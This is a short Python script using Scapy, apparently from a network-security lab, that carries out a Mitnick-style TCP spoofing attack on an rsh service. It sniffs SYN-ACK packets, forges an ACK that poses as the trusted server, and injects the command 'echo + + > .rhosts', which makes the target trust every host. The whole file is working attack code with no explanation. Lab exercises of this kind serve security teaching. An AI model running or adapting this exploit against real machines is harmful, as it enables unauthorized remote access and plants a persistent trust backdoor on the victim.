#!/usr/bin/python3
from scapy.all import *
'''
server 10.9.0.6
xterm 10.9.0.5
myself 10.9.0.7
'''

def spoof(pkt):
    if pkt[TCP].flags=="SA" :
        ip=IP(src="10.9.0.6",dst="10.9.0.5")
        tcp=TCP(sport=1023,dport=514)
        tcp.flags="A"
        tcp.seq=pkt[TCP].ack
        tcp.ack=pkt[TCP].seq+1
        tcp.window=pkt[TCP].window
        data="9090\x00seed\x00seed\x00echo + + > .rhosts\x00"
        p=ip/tcp/data
        send(p)
sniff(iface="br-223f3c20d7b3",filter="src 10.9.0.5 and dst 10.9.0.6 and tcp",prn=spoof)